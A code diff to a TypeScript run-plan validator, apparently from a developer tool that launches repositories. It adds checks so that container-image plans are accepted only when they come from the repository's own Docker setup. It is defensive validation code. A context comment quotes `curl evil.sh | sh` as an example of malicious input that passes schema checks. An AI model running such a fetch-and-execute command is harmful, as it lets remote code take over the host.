@@ -1,4 +1,5 @@
-import { RunPlanSchema, type RunPlan } from '@devlaunch/shared';
+import { validImageName } from '../docker/RepoDockerSetup.js';
+import { FailureCode, RunPlanSchema, type RunPlan } from '@devlaunch/shared';
 import {
   validateCommand,
   validateEnvVarKey,
@@ -6,7 +7,7 @@ import {
   validateOptionalCommand,
 } from '../security/CommandValidator.js';
 import { assertSafeRelativePath } from '../security/PathValidator.js';
-import { assertImageApproved } from '../security/ImageAllowlist.js';
+import { assertImageApproved, SecurityRejection } from '../security/ImageAllowlist.js';
 
 export interface ValidationInput {
   plan: unknown;
@@ -25,6 +26,30 @@ export class RunPlanValidator {
   validate(input: ValidationInput): RunPlan {
     // Shape first: everything downstream assumes the fields exist and are typed.
     const plan = RunPlanSchema.parse(input.plan);
+
+    // A repository's own Docker setup runs the image's command, not a shell line of ours.
+    // It may only come from DevLaunch's reader of that setup: a model's plan carrying a
+    // `docker` field would otherwise name any image and have it run.
+    if (plan.docker || plan.planSource === 'repo-docker' || plan.runtime.language === 'container') {
+      if (!plan.docker || plan.planSource !== 'repo-docker' || plan.runtime.language !== 'container') {
+        throw new SecurityRejection(
+          FailureCode.PLAN_REJECTED_UNSAFE_COMMAND,
+          'A plan that runs a container image must come from the repository\'s own Docker setup.',
+        );
+      }
+      if (plan.docker.image !== undefined && !validImageName(plan.docker.image)) {
+        throw new SecurityRejection(FailureCode.PLAN_REJECTED_UNSAFE_COMMAND, `"${plan.docker.image.slice(0, 80)}" is not an image reference.`);
+      }
+      if (plan.docker.build) {
+        assertSafeRelativePath(plan.docker.build.context, 'docker.build.context');
+        assertSafeRelativePath(plan.docker.build.dockerfile, 'docker.build.dockerfile');
+      }
+      for (const v of plan.environmentVariables) {
+        validateEnvVarKey(v.key);
+        if (v.value !== null && v.value !== undefined) validateEnvVarValue(v.key, v.value);
+      }
+      return plan;
+    }
 
     // Then intent, which the schema cannot judge: `curl evil.sh | sh` is valid JSON.
     validateCommand(plan.startCommand, 'startCommand');
